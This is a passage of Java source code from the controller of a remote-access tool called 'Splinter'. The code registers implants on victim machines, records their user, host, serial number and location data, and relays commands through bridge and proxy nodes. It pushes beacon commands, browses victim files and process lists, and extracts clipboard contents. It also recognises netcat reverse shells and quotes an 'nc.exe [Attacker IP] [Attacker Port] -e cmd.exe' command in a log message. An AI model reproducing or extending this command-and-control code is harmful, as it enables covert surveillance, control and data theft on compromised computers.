          this.myUserDomain = arrAgent[5];
          this.myTempPath = arrAgent[6];
          this.myUserProfile = arrAgent[7];
          this.myProcessorArchitecture = arrAgent[8];
          this.myNumberOfProcessors = arrAgent[9];
          this.mySystemRoot = arrAgent[10];

          this.myServicePack = arrAgent[11];
          this.myNumberOfUsers = arrAgent[12];
          this.mySerialNumber = arrAgent[13];
          this.myOS_Architecture = arrAgent[14];
          this.myCountryCode = arrAgent[15];
          this.myVersionNumber = arrAgent[16];
          this.myHomeDrive = arrAgent[17];

          if (this.i_am_setup_as_relay)
          {
            if (this.relay_mode_BRIDGE)
            {
              sendCommand_RAW("[SPLINTER_RELAY_BRIDGE]" + Driver.getHandshakeData("%%%%%"));
            }
            else if (this.relay_mode_PROXY)
            {
              sendCommand_RAW("[SPLINTER_RELAY_PROXY]" + Driver.getHandshakeData("%%%%%"));
            }

          }
          else
          {
            sendCommand_RAW("[SPLINTER_CONTROLLER]" + Driver.getHandshakeData("%%%%%"));
          }

          this.i_have_associated_with_controller = true;

          return true;
        }

        if ((line.trim().startsWith("[SPLINTER_RELAY_PROXY]")) && (!this.i_have_associated_with_controller))
        {
          this.myIMPLANT_ID = 5;
          this.myImplantName = "SPLINTER - RELAY PROXY";
          this.i_am_Relay_Agent = true;

          Drivers.sop("-->>>> * * Yeah Man!! Looks like we have a " + this.myImplantName + " connected!  -->>>> confidence: 100%.  Setting up the environment to handle this controller");

          this.connectedAgentHandshake_BackwardLink_Relay = line;
          try
          {
            line = line.replace("[SPLINTER_RELAY_PROXY]", "");
          }
          catch (Exception localException5)
          {
          }
          String[] arrAgent = line.split("%%%%%");

          if ((arrAgent == null) || (arrAgent.length < 2))
          {
            Driver.sop("Invalid handshake received! Unable to determine agent connection type");
            Driver.sop("received line: " + line);
            return false;
          }

          this.myImplantInitialLaunchDirectory = arrAgent[0];
          this.myHostName = arrAgent[1];
          this.myOS = arrAgent[2];
          this.myOS_Type = arrAgent[3];
          this.myUserName = arrAgent[4];
          this.myUserDomain = arrAgent[5];
          this.myTempPath = arrAgent[6];
          this.myUserProfile = arrAgent[7];
          this.myProcessorArchitecture = arrAgent[8];
          this.myNumberOfProcessors = arrAgent[9];
          this.mySystemRoot = arrAgent[10];

          this.myServicePack = arrAgent[11];
          this.myNumberOfUsers = arrAgent[12];
          this.mySerialNumber = arrAgent[13];
          this.myOS_Architecture = arrAgent[14];
          this.myCountryCode = arrAgent[15];
          this.myVersionNumber = arrAgent[16];
          this.myHomeDrive = arrAgent[17];

          this.myRandomIdentifier = Driver.getUniqueRandomNumber();

          this.myUniqueDelimiter = ("[SPLINTER_IMPLANT@" + this.myRandomIdentifier + "]");

          sendCommand_RAW(""+this.myRandomIdentifier);
          try
          {
            Drivers.appendRelayMessageCommandTerminal("NEW AGENT HAS JOINED THE RELAY: --->>> [ " + this.myUserName + " @ " + this.myVictim_RHOST_IP + " - " + this.myHostName + " ]");
            this.myCareOfAddress = this.myVictim_RHOST_IP;
          }
          catch (Exception e)
          {
            Drivers.appendRelayMessageCommandTerminal("NEW AGENT HAS JOINED THE RELAY!!!");
          }

          if (this.i_am_setup_as_relay)
          {
            if (this.relay_mode_BRIDGE)
            {
              sendCommand_RAW("[SPLINTER_RELAY_BRIDGE]" + Driver.getHandshakeData("%%%%%"));
            }
            else if (this.relay_mode_PROXY)
            {
              sendCommand_RAW("[SPLINTER_RELAY_PROXY]" + Driver.getHandshakeData("%%%%%"));
            }

          }
          else
          {
            sendCommand_RAW("[SPLINTER_CONTROLLER]" + Driver.getHandshakeData("%%%%%"));
          }

          this.i_have_associated_with_controller = true;

          return true;
        }

        if ((this.i_am_setup_as_relay) && (this.relay_mode_BRIDGE))
        {
          relayMessage_BRIDGE(line);

          return true;
        }

        if ((this.i_am_setup_as_relay) && (this.relay_mode_PROXY))
        {
          relayMessage_PROXY_FORWARD_LINK(line);

          return true;
        }

        if (line.trim().startsWith("[RELAY_ECHO]"))
        {
          String[] arrCmd = line.split("%%%%%");
          try
          {
            if (arrCmd[4].startsWith("[SPLINTER_CONTROLLER]"))
            {
              Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, "NEW CONTROLLER HAS JOINED THE BRIDGE: ---->>> [ " + arrCmd[8] + " @ " + arrCmd[3] + " - " + arrCmd[5] + "] " + "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t", Drivers.clrController, Drivers.clrImplant.darker().darker());
            }
            else
            {
              Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, "RELAYED COMMAND [ " + arrCmd[1] + " @ " + arrCmd[3] + "] --> " + arrCmd[4] + "\t\t\t\t\t\t\t\t\t", Drivers.clrController, Drivers.clrImplant.darker().darker());
            }
          }
          catch (Exception e) {
            Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, "RELAYED COMMAND RECEIVED: [" + line + "]" + "\t\t\t\t\t\t\t\t\t", Drivers.clrController, Drivers.clrImplant.darker().darker());
          }

          return true;
        }

      }

      if (this.i_am_Controller_Agent)
      {
        if (line.trim().startsWith(Driver.CHAT_MESSAGE_BROADCAST))
        {
          String[] arrcmd = line.split("%%%%%");
          this.privateChatMsg = false;
          if (arrcmd[1].equalsIgnoreCase(Driver.FLAG_PRIVATE))
          {
            this.privateChatMsg = true;
          }

          if (!arrcmd[3].trim().equals(this.myChatScreenName))
          {
            if (!this.i_am_setup_as_relay)
            {
              Drivers.updateConnectedImplants();
            }

          }

          this.myChatScreenName = arrcmd[3];

          Drivers.txtpne_mainChatBoard.appendString(true, this.privateChatMsg, getChatScreenName(), "", arrcmd[2], Drivers.clrBackground, Drivers.clrImplant, Drivers.clrController);
        }

        return true;
      }

      if (line.startsWith("REQUEST BEACON COMMAND LIST"))
      {
        String[] data = line.split("#####");

        storeHandShakeData(data[1]);

        this.myIMPLANT_ID = 6;
        try { this.myImplantName = Driver.ARR_IMPLANT_NAME[this.myIMPLANT_ID]; } catch (Exception e) { this.myImplantName = "UNKNOWN"; }

        processBeaconCheckin(data[0]);
        return true;
      }

      if ((line.startsWith(this.myUniqueDelimiter)) || (line.startsWith("[SPLINTER_IMPLANT@")))
      {
        try
        {
          if (line.contains("Image Name,PID,Session Name,Session#,Mem Usage,Status,User Name,CPU Time,Window Title"))
          {
            return true;
          }

          String[] arrcmd = line.split("%%%%%");

          if (arrcmd[1].equals("BEGIN_RUNNING_PS"))
          {
            if (this.pauseRunningProcessUpdate)
            {
              return true;
            }

            if ((this.runningProcessFrame == null) || (!this.runningProcessFrame.isShowing()) || (!this.runningProcessFrame.isDisplayable()))
            {
              this.runningProcessFrame = new Frame_RunningProcessList(4, this);
              this.runningProcessFrame.setVisible(true);

              this.runningProcessFrame.processInterrupt_RefreshJTable = false;
            }
            try
            {
              this.runningProcessFrame.alNewProcesses.clear(); } catch (Exception localException6) {
            }
            return true;
          }

          if (arrcmd[1].equals("DATA_RUNNING_PS"))
          {
            if (this.pauseRunningProcessUpdate)
            {
              return true;
            }

            try
            {
              String s = arrcmd[2];
            }
            catch (Exception e)
            {
              String s;
              return true;
            }
            if (this.frameRunningProcessIsDisposed)
            {
              return true;
            }

            try
            {
              String[] processData = arrcmd[2].split(",");

              if (processData.length == 10)
              {
                this.ndeRunningProcess = new Node_RunningProcess(processData[0], Long.parseLong(processData[1]), processData[2], processData[3], processData[4] + "," + processData[5], processData[6], processData[7], processData[8], processData[9]);
              }
              else
              {
                this.ndeRunningProcess = new Node_RunningProcess(processData[0], Long.parseLong(processData[1]), processData[2], processData[3], processData[4], processData[5], processData[6], processData[7], processData[8]);
              }

              this.runningProcessFrame.alNewProcesses.add(this.ndeRunningProcess);
            }
            catch (Exception e)
            {
              Driver.sop("Invalid line received from Thread [" + this.myThread_ID + "]: " + line);
            }

            return true;
          }

          if (arrcmd[1].equals("END_RUNNING_PS"))
          {
            if (this.pauseRunningProcessUpdate)
            {
              return true;
            }

            this.runningProcessFrame.alCurrentDisplayedProcesses = this.runningProcessFrame.alNewProcesses;

            this.runningProcessFrame.processInterrupt_RefreshJTable = true;

            return true;
          }

          if (arrcmd[1].equals("BEGIN_FILE_ROOTS"))
          {
            if (this.myFileBrowser != null) try { this.myFileBrowser.dispose();
              } catch (Exception localException7) {
              } this.myFileBrowser = new Frame_FileBrowser(this);
            try
            {
              this.myFileBrowser.alNewFileRoots.clear(); } catch (Exception localException8) {
            }try { this.myFileBrowser.alNewFileList.clear();
            } catch (Exception localException9) {
            }
            this.myFileBrowser.processUpdateInterrupt = false;
            this.myFileBrowser.updateFileRoots = false;
            this.myFileBrowser.updateFileList = false;

            return true;
          }

          if (arrcmd[1].equals("FILE_ROOTS"))
          {
            this.arrObjectData = arrcmd[2].split("#####");

            this.fle__isDrive = this.arrObjectData[0];
            this.fle__fle = this.arrObjectData[1];
            this.fle__driveDisplayName = this.arrObjectData[2];
            this.fle__isFileSystem = this.arrObjectData[3];
            this.fle__isFloppy = this.arrObjectData[4];
            this.fle__isDirectory = this.arrObjectData[5];
            this.fle__isFile = this.arrObjectData[6];
            this.fle__isHidden = this.arrObjectData[7];
            this.fle__isTraversable = this.arrObjectData[8];
            this.fle__canRead = this.arrObjectData[9];
            this.fle__canWrite = this.arrObjectData[10];
            this.fle__canExecute = this.arrObjectData[11];
            this.fle__fullPath = this.arrObjectData[12];
            this.fle__parentDirectory = this.arrObjectData[13];
            this.fle__dateLastModified_long = this.arrObjectData[14];
            this.fle__totalSpace = this.arrObjectData[15];
            this.fle__usableSpace = this.arrObjectData[16];
            this.fle__Size = this.arrObjectData[17];
            this.fle__upDirectory = this.arrObjectData[18];

            this.objFileBrowser = new Object_FileBrowser(this.fle__isDrive, this.fle__fle, this.fle__driveDisplayName, this.fle__isFileSystem, this.fle__isFloppy, this.fle__isDirectory, this.fle__isFile, this.fle__isHidden, this.fle__isTraversable, this.fle__canRead, this.fle__canWrite, this.fle__canExecute, this.fle__fullPath, this.fle__parentDirectory, this.fle__dateLastModified_long, this.fle__totalSpace, this.fle__usableSpace, this.fle__Size, this.fle__upDirectory);

            this.myFileBrowser.alNewFileRoots.add(this.objFileBrowser);

            if ((this.objFileBrowser.myFile_fle != null) && (this.objFileBrowser.myFile_fle.trim().equalsIgnoreCase("C:\\")))
            {
              this.objStartingFileDirectory = this.objFileBrowser;
            }

            return true;
          }

          if (arrcmd[1].equals("END_FILE_ROOTS"))
          {
            try {
              this.myFileBrowser.alCurrFileList.clear(); } catch (Exception localException10) {
            }try { this.myFileBrowser.alCurrFileRoots.clear(); } catch (Exception localException11) {
            }
            for (int i = 0; i < this.myFileBrowser.alNewFileRoots.size(); i++)
            {
              this.myFileBrowser.alCurrFileRoots.add((Object_FileBrowser)this.myFileBrowser.alNewFileRoots.get(i));
              ((Object_FileBrowser)this.myFileBrowser.alCurrFileRoots.get(i)).myIndexInArrayList = i;
            }

            this.myFileBrowser.setVisible(true);

            this.myFileBrowser.processUpdateInterrupt = true;
            this.myFileBrowser.updateFileRoots = true;
          }
          else if (arrcmd[1].equals("FILE_BROWSER_MESSAGE"))
          {
            try
            {
              if ((this.myFileBrowser != null) && (!this.frameFileBrowserIsDisposed))
              {
                this.myFileBrowser.jtxtpne_ConsoleOut.appendString(true, ""+this.myThread_ID, arrcmd[2], Drivers.clrImplant, Drivers.clrBackground);
              }
              else
              {
                postResponse("FILE BROWSER: " + arrcmd[2]);
              }

            }
            catch (Exception localException12)
            {
            }

          }
          else if (arrcmd[1].equals("BEGIN_FILE_LIST"))
          {
            if ((this.myFileBrowser == null) || (this.frameFileBrowserIsDisposed))
            {
              return false;
            }
            try
            {
              this.myFileBrowser.alNewFileList.clear(); } catch (Exception localException13) {
            }try {
              this.myFileBrowser.jcbFileName.removeAllItems(); this.myFileBrowser.jcbFileName.addItem(""); } catch (Exception localException14) {
            }try {
              this.myFileBrowser.jcbCurrentDirectoryFilter.removeAllItems(); this.myFileBrowser.jcbCurrentDirectoryFilter.addItem(""); } catch (Exception localException15) {
            }
            this.myFileBrowser.processUpdateInterrupt = false;
            this.myFileBrowser.updateFileList = false;
          }
          else if (arrcmd[1].equals("FILE_LIST"))
          {
            if ((this.myFileBrowser == null) || (this.frameFileBrowserIsDisposed))
            {
              return false;
            }

            if (!this.myFileBrowser.jtblFileBrowser.jlblUpdatingList.isVisible())
            {
              this.myFileBrowser.jtblFileBrowser.jlblUpdatingList.setVisible(true);
            }

            this.arrObjectData = arrcmd[2].split("#####");

            this.fle__isDrive = this.arrObjectData[0];
            this.fle__fle = this.arrObjectData[1];
            this.fle__driveDisplayName = this.arrObjectData[2];
            this.fle__isFileSystem = this.arrObjectData[3];
            this.fle__isFloppy = this.arrObjectData[4];
            this.fle__isDirectory = this.arrObjectData[5];
            this.fle__isFile = this.arrObjectData[6];
            this.fle__isHidden = this.arrObjectData[7];
            this.fle__isTraversable = this.arrObjectData[8];
            this.fle__canRead = this.arrObjectData[9];
            this.fle__canWrite = this.arrObjectData[10];
            this.fle__canExecute = this.arrObjectData[11];
            this.fle__fullPath = this.arrObjectData[12];
            this.fle__parentDirectory = this.arrObjectData[13];
            this.fle__dateLastModified_long = this.arrObjectData[14];
            this.fle__totalSpace = this.arrObjectData[15];
            this.fle__usableSpace = this.arrObjectData[16];
            this.fle__Size = this.arrObjectData[17];
            this.fle__upDirectory = this.arrObjectData[18];

            this.objFileBrowser = new Object_FileBrowser(this.fle__isDrive, this.fle__fle, this.fle__driveDisplayName, this.fle__isFileSystem, this.fle__isFloppy, this.fle__isDirectory, this.fle__isFile, this.fle__isHidden, this.fle__isTraversable, this.fle__canRead, this.fle__canWrite, this.fle__canExecute, this.fle__fullPath, this.fle__parentDirectory, this.fle__dateLastModified_long, this.fle__totalSpace, this.fle__usableSpace, this.fle__Size, this.fle__upDirectory);

            this.myFileBrowser.alNewFileList.add(this.objFileBrowser);
            try	
			{	
				if(objFileBrowser.i_am_a_file)
				{
					myFileBrowser.jcbFileName.addItem(fle__fullPath);
					
					String extension = "";
					boolean found = false;
					for(int i = 0; i < myFileBrowser.jcbCurrentDirectoryFilter.getItemCount(); i++)
					{
						extension = (String)myFileBrowser.jcbCurrentDirectoryFilter.getItemAt(i);
						
						if(extension != null && (extension.equalsIgnoreCase(objFileBrowser.myFileExtension_withoutPeriod) || objFileBrowser.myFileExtension_withoutPeriod.trim().equals("-")))
						{										
							found = true;
							break;
						}
						
					}
					
					if(!found)
					{
						//add the new extension
						myFileBrowser.jcbCurrentDirectoryFilter.addItem(objFileBrowser.myFileExtension_withoutPeriod);
					}
						
					
				}
			}catch(Exception eee){}

          }
          else if (arrcmd[1].equals("END_FILE_LIST"))
          {
            try {
              this.myFileBrowser.alCurrFileList.clear(); } catch (Exception localException17) {
            }
            for (int i = 0; i < this.myFileBrowser.alNewFileList.size(); i++)
            {
              this.myFileBrowser.alCurrFileList.add((Object_FileBrowser)this.myFileBrowser.alNewFileList.get(i));
              ((Object_FileBrowser)this.myFileBrowser.alCurrFileList.get(i)).myIndexInArrayList = i;
            }

            this.myFileBrowser.processUpdateInterrupt = true;
            this.myFileBrowser.updateFileList = true;

            this.myFileBrowser.jtblFileBrowser.jlblUpdatingList.setVisible(false);
          }
          else if (arrcmd[1].equals("EMPTY_DIRECTORY"))
          {
            try
            {
              this.myFileBrowser.alCurrFileList.clear();
            } catch (Exception localException18) {
            }
            this.myFileBrowser.emptyDirectoryPath_only_used_if_alCurrFileList_is_empty = arrcmd[2];

            this.arrObjectData = arrcmd[3].split("#####");

            this.fle__isDrive = this.arrObjectData[0];
            this.fle__fle = this.arrObjectData[1];
            this.fle__driveDisplayName = this.arrObjectData[2];
            this.fle__isFileSystem = this.arrObjectData[3];
            this.fle__isFloppy = this.arrObjectData[4];
            this.fle__isDirectory = this.arrObjectData[5];
            this.fle__isFile = this.arrObjectData[6];
            this.fle__isHidden = this.arrObjectData[7];
            this.fle__isTraversable = this.arrObjectData[8];
            this.fle__canRead = this.arrObjectData[9];
            this.fle__canWrite = this.arrObjectData[10];
            this.fle__canExecute = this.arrObjectData[11];
            this.fle__fullPath = this.arrObjectData[12];
            this.fle__parentDirectory = this.arrObjectData[13];
            this.fle__dateLastModified_long = this.arrObjectData[14];
            this.fle__totalSpace = this.arrObjectData[15];
            this.fle__usableSpace = this.arrObjectData[16];
            this.fle__Size = this.arrObjectData[17];
            this.fle__upDirectory = this.arrObjectData[18];

            this.objFileBrowser = new Object_FileBrowser(this.fle__isDrive, this.fle__fle, this.fle__driveDisplayName, this.fle__isFileSystem, this.fle__isFloppy, this.fle__isDirectory, this.fle__isFile, this.fle__isHidden, this.fle__isTraversable, this.fle__canRead, this.fle__canWrite, this.fle__canExecute, this.fle__fullPath, this.fle__parentDirectory, this.fle__dateLastModified_long, this.fle__totalSpace, this.fle__usableSpace, this.fle__Size, this.fle__upDirectory);

            this.myFileBrowser.objFileBrowser_EmptyDirectory = this.objFileBrowser;

            this.myFileBrowser.processUpdateInterrupt = true;
            this.myFileBrowser.updateFileList = true;

            this.myFileBrowser.jtblFileBrowser.jlblUpdatingList.setVisible(false);
          }
          else if (arrcmd[1].equals("RESPONSE_CLIPBOARD"))
          {
            if (arrcmd[2].equalsIgnoreCase(" *** --> NO TEXT IN CLIPBOARD AVAILABLE <-- ***"))
            {
              Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, "CONTROLLER MESSAGE: Note, I have detected an error from this agent interacting with host system's clipboard. Sending clipboard kill command now...", Drivers.clrBackground, Drivers.clrForeground);
              sendCommand_RAW("DISABLE CLIPBOARD EXTRACTOR");
            }
            else
            {
              Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, "CLIPBOARD: \"" + arrcmd[2] + "\"", Drivers.clrForeground, Drivers.clrBackground);
            }

          }
          else
          {
            if (line.trim().startsWith("[SPLINTER_CONTROLLER]"))
            {
              return true;
            }

            postResponse("UNK CMD: " + line);
          }

        }
        catch (Exception e)
        {
          postResponse(line);
        }

      }

      label5299: return true;
    }
    catch (ArrayIndexOutOfBoundsException aioeb)
    {
      Drivers.eop("determineCommand", this.strMyClassName, aioeb, aioeb.getLocalizedMessage(), false);
      Drivers.sop("Tisk Tisk!!!!  Missed it by that much. Authentication failed for this implant... invalid parameters passed in");
    }
    catch (Exception e)
    {
      Drivers.eop("determineCommand", this.strMyClassName, e, e.getLocalizedMessage(), false);
      Drivers.sop("Geez!!!!  Missed it by that much. Authentication failed for this implant... invalid parameters passed in");
    }

    this.myIMPLANT_ID = 0;
    try { this.myImplantName = Driver.ARR_IMPLANT_NAME[this.myIMPLANT_ID]; } catch (Exception e) { this.myImplantName = "UNKNOWN"; }


    return false;
  }

  public boolean processBeaconCheckin(String fullCmdLine)
  {
    try
    {
      String[] arrCmd = fullCmdLine.split("%%%%%");
      String agentConfirmationID = ""+this.myRandomIdentifier;

      if ((arrCmd == null) || (arrCmd.length < 2))
      {
        Driver.sop("\n\nNOTE: AGENT CONFIRMATION ID NOT RECEIVED FOR Thread: " + getThreadID());
      }
      else
      {
        agentConfirmationID = arrCmd[1];
        this.myReceivedConfirmationID_From_Implant = arrCmd[1];
      }

      if (!agentConfirmationID.trim().equalsIgnoreCase(agentConfirmationID.trim()))
      {
        if (Driver.alBeaconTerminals.contains(this))
        {
          Driver.alBeaconTerminals.remove(this);

          Drivers.jtblBeaconImplants.updateJTable = true;

          Driver.sop(" * * * " + Driver.getTimeStamp_Without_Date() + " - Agent checkin received from: " + agentConfirmationID);
        }

      }

      JPanel_BeaconCommand cmd = null;
      String command = "";
      int numCommandsSent = 0;
      for (int i = 0; i < Drivers.alBeaconCommands_GUI.size(); i++)
      {
        try
        {
          cmd = (JPanel_BeaconCommand)Drivers.alBeaconCommands_GUI.get(i);
          command = cmd.jtfCommand.getText().trim();

          if ((cmd.jcbEnable.isSelected()) && (!command.equals("")))
          {
            sendCommand_RAW("BEACON COMMAND%%%%%" + command);
            numCommandsSent++;
          }

        }
        catch (Exception localException1)
        {
        }

      }

      sendCommand_RAW("[END BEACON COMMAND UPDATES]");

      if ((this.myReceivedConfirmationID_From_Implant != null) && (!this.myReceivedConfirmationID_From_Implant.trim().equals("")))
      {
        this.myConfirmationID_Beacon = this.myReceivedConfirmationID_From_Implant;
      }

      updateBeaconConnectionTime(this.myReceivedConfirmationID_From_Implant);

      if (numCommandsSent < 1)
      {
        Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, "Agent checkin received from Agent ID: " + agentConfirmationID + ".  (0) commands sent to beacon implant...", Drivers.clrImplant, Drivers.clrBackground);
      }
      else if (numCommandsSent == 1)
      {
        Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, "Agent checkin received from Agent ID: " + agentConfirmationID + " --> [" + numCommandsSent + "] command sent to beacon implant...", Drivers.clrImplant, Drivers.clrBackground);
      }
      else
      {
        Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, "Agent checkin received from Agent ID: " + agentConfirmationID + " --> [" + numCommandsSent + "] commands sent to beacon implant...", Drivers.clrImplant, Drivers.clrBackground);
      }

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("processBeaconCheckin", this.strMyClassName, e, "", false);
    }

    return false;
  }

  public boolean relayMessage_BRIDGE(String msg)
  {
    try
    {
      if ((Driver.alRelayTerminals != null) && (Driver.alRelayTerminals.size() > 0))
      {
        Thread_Terminal agent = null;

        for (int i = 0; i < Driver.alRelayTerminals.size(); i++)
        {
          agent = (Thread_Terminal)Driver.alRelayTerminals.get(i);
          if (agent != this)
          {
            if ((this.i_am_Controller_Agent) && (agent.i_am_Controller_Agent))
            {
              agent.sendCommand_RAW("[RELAY_ECHO]%%%%%" + this.myImplantName + "%%%%%" + getJListData() + "%%%%%" + this.myVictim_RHOST_IP + "%%%%%" + msg);
            }
            else
            {
              agent.sendCommand_RAW(msg);
            }
          }
        }
      }

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("relayMessage_BRIDGE", this.strMyClassName, e, "", false);
    }

    return false;
  }

  public boolean showMyselfOnMap()
  {
    try
    {
      if ((this.myGEO_Latitude == null) || (this.myGEO_Latitude.trim().equals("")) || (this.myGEO_Longitude == null) || (this.myGEO_Longitude.trim().equals("")))
      {
        Drivers.jop_Error("Lat/Lon data not populated for this thread: " + getId(), "Unable to display map data");
        return false;
      }

      ShowMap meOnMap = new ShowMap(this);
      meOnMap.start();

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("showMyselfOnMap", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  private boolean acquireOverheadData(BufferedReader brSocket, PrintWriter pwSocket)
  {
    try
    {
      acquireOverheadData_WINDOWS(brSocket, pwSocket);

      if ((this.continueRun) && (!this.killThread) && (!this.I_am_Disconnected_From_Implant))
      {
        if (!this.i_am_Beacon_Agent)
        {
          resolve_GEO_LOCATION();
        }

      }

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("acquireOverheadData", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean resolve_GEO_LOCATION()
  {
    try
    {
      if (Driver.enableGPS_Resolution)
      {
        this.myGeoLocation = new GeoThread(this);
        this.myGeoLocation.start();
      }
      else
      {
        this.myFullGeoData = "GPS Resolution Disabled";
      }

      this.geo_resolution_complete = true;

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("resolve_GEO_LOCATION", this.strMyClassName, e, "", false);

      this.geo_resolution_complete = true;
    }
    return false;
  }

  private boolean acquireOverheadData_WINDOWS(BufferedReader brSocket, PrintWriter pwSocket)
  {
    this.dataAcquisitionComplete = true;
    String strFirstLine = "";
    try
    {
      Drivers.sop("\nAttempting to interrogate connected implant to determine agent type...");

      strFirstLine = brSocket.readLine();

      if ((strFirstLine != null) && (strFirstLine.trim().startsWith("[SPLINTER_LOGGIE_AGENT]")))
      {
        Driver.sop("Splinter LOGGING Agent registration started...");
        if (!determineCommand(strFirstLine))
        {
          throw new UnsupportedOperationException("Unknown Agent Connected");
        }

        this.I_have_an_important_message = "";

        Driver.alLoggingAgents.add(this);

        Drivers.jtblLoggingAgents.updateJTable = true;

        this.dataAcquisitionComplete = true;

        return true;
      }

      if ((strFirstLine != null) && (strFirstLine.trim().startsWith("[SPLINTER_BEACON]")))
      {
        Driver.sop("Splinter BEACON Implant registration started...");
        if (!determineCommand(strFirstLine))
        {
          throw new UnsupportedOperationException("Unknown Agent Connected");
        }

        if (Drivers.alTerminals.contains(this))
        {
          Drivers.alTerminals.remove(this);
        }

        updateBeaconConnectionTime(""+this.myRandomIdentifier);

        Drivers.jtblBeaconImplants.updateJTable = true;

        this.dataAcquisitionComplete = true;
        return true;
      }

      if ((strFirstLine != null) && (strFirstLine.trim().startsWith("[SPLINTER_BEACON_RESPONSE_HEADER]")))
      {
        this.i_am_Beacon_Agent = true;
        this.i_am_receiving_beacon_response = true;

        String temp = strFirstLine;

        this.myReceivedConfirmationID_From_Implant = temp.replace("[SPLINTER_BEACON_RESPONSE_HEADER]", "").trim();

        if (Drivers.alTerminals.contains(this))
        {
          Drivers.alTerminals.remove(this);
        }

        if (!determineCommand(strFirstLine))
        {
          throw new UnsupportedOperationException("Unknown Agent Connected");
        }

        updateBeaconConnectionTime(this.myReceivedConfirmationID_From_Implant);

        Drivers.jtblBeaconImplants.updateJTable = true;

        this.dataAcquisitionComplete = true;
        return true;
      }

      if ((strFirstLine != null) && (strFirstLine.trim().startsWith("[SPLINTER_IMPLANT]")))
      {
        Driver.sop("Splinter Implant registration started...");
        if (!determineCommand(strFirstLine))
        {
          throw new UnsupportedOperationException("Unknown Agent Connected");
        }

        this.I_have_an_important_message = "";

        if (!this.i_am_setup_as_relay)
        {
          Drivers.alTerminals.add(this);
          Drivers.updateConnectedImplants();
          Drivers.jtblConnectedImplants.updateJTable = true;
        }

        this.dataAcquisitionComplete = true;
        return true;
      }

      if ((strFirstLine != null) && (strFirstLine.trim().startsWith("[SPLINTER_CONTROLLER]")))
      {
        if (!determineCommand(strFirstLine))
        {
          throw new UnsupportedOperationException("Unknown Agent Connected");
        }

        this.I_have_an_important_message = "";

        if (!this.i_am_setup_as_relay)
        {
          Drivers.alTerminals.add(this);

          Drivers.updateConnectedImplants();
          Drivers.jtblConnectedImplants.updateJTable = true;
        }

        this.dataAcquisitionComplete = true;
        return true;
      }

      if ((strFirstLine != null) && (strFirstLine.trim().startsWith("[SPLINTER_RELAY_BRIDGE]")))
      {
        if (!determineCommand(strFirstLine))
        {
          throw new UnsupportedOperationException("Unknown Agent Connected");
        }

        this.I_have_an_important_message = "";

        if (!this.i_am_setup_as_relay)
        {
          Drivers.alTerminals.add(this);

          Drivers.updateConnectedImplants();
          Drivers.jtblConnectedImplants.updateJTable = true;
        }

        this.dataAcquisitionComplete = true;
        return true;
      }

      if ((strFirstLine != null) && (strFirstLine.trim().startsWith("[SPLINTER_RELAY_PROXY]")))
      {
        if (!determineCommand(strFirstLine))
        {
          throw new UnsupportedOperationException("Unknown Agent Connected");
        }

        this.I_have_an_important_message = "";

        if (!this.i_am_setup_as_relay)
        {
          Drivers.alTerminals.add(this);

          Drivers.updateConnectedImplants();
          Drivers.jtblConnectedImplants.updateJTable = true;
        }

        this.dataAcquisitionComplete = true;
        return true;
      }

      if ((strFirstLine != null) && (strFirstLine.contains("[Version")))
      {
        Drivers.sop("-> Interesting. It appears I am connected to a backdoor that binds to cmd.exe similar to executing the command: nc.exe [Attacker IP] [Attacker Port] -e cmd.exe.  Perhaps this is a netcat implant --> Confidence level for netcat: 25% --> I am launching the netcat_windows subroutine to configure the environment...");

        String strSecondLine = brSocket.readLine();

        if ((strSecondLine != null) && (strSecondLine.contains("Copyright (c)")))
        {
          Drivers.sop("-->> This is good. It appears it is a netcat implant -->> Confidence level for netcat: 50% ...");

          if (interrogateNewAgent_NETCAT_NEWER(brSocket))
          {
            Drivers.alTerminals.add(this);

            if (!this.i_am_setup_as_relay)
            {
              Drivers.updateConnectedImplants();
            }

            this.dataAcquisitionComplete = true;
            this.I_have_an_important_message = "";
            return true;
          }

          throw new UnsupportedOperationException("Unknown Agent Connected");
        }

        if ((strSecondLine != null) && (strSecondLine.contains("(C) Copyright")))
        {
          Drivers.sop("-->> Geez! Older version of Windows Command Prompt Detected! -->> Confidence level for netcat: 50% ...");

          if (interrogateNewAgent_NETCAT_OLDER(brSocket))
          {
            Drivers.alTerminals.add(this);

            if (!this.i_am_setup_as_relay)
            {
              Drivers.updateConnectedImplants();
            }

            this.dataAcquisitionComplete = true;
            this.I_have_an_important_message = "";
            return true;
          }

          throw new UnsupportedOperationException("Unknown Agent Connected");
        }

      }
      else
      {
        throw new UnsupportedOperationException("Unknown Agent Connected");
      }

      this.I_have_an_important_message = "";

      if (!this.i_am_setup_as_relay)
      {
        if (this.i_am_Beacon_Agent)
        {
          Drivers.updateBeaconImplants();
        }
        else
        {
          Drivers.updateConnectedImplants();
        }

      }

      this.dataAcquisitionComplete = true;

      return true;
    }
    catch (UnsupportedOperationException uoe)
    {
      if (Drivers.alTerminals != null) {
        Drivers.alTerminals.add(this);
      }

      Drivers.sop("* * Interrogation to this system failed (Thread ID: " + this.myThread_ID + ").  First Line returned: \"" + strFirstLine + "\" I can not determine the type of agent connected.  However, you might still be able to correspond with the agent!");

      pwSocket.println("");
    }
    catch (SocketException se)
    {
      Drivers.sop("Well then!!!  Socket closed abruptly - I am disposing of this thread meant to corresponsd with the implant");
      this.continueRun = false;

      Drivers.removeThread(this, getId());
    }
    catch (Exception e)
    {
      Drivers.eop("acquireOverheadData_WINDOWS", this.strMyClassName, e, e.getLocalizedMessage(), true);

